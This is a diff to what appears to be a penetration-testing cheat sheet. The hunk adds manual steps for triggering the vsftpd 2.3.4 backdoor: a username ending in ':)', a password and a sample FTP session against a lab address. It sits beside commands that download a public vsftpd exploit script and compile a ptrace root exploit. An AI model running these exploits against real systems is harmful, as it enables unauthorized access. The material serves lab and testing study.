@@ -2044,7 +2044,13 @@ gcc -Wall --std=gnu99 -s poc.c -o ptrace_traceme_root
 wget https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py
 
 # Manually
-ftp 10.10.10.10
+- Use "user:)" as user and use "pass" as pass
+└─▶ ftp 10.10.10.131                                                                                                                                                                               
+Connected to 10.10.10.131.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.131:root): user:)
+331 Please specify the password.
+Password: pass
 
 # Usage
 └─▶ python3 vsftpd_234_exploit.py 10.150.150.12 21 whoami
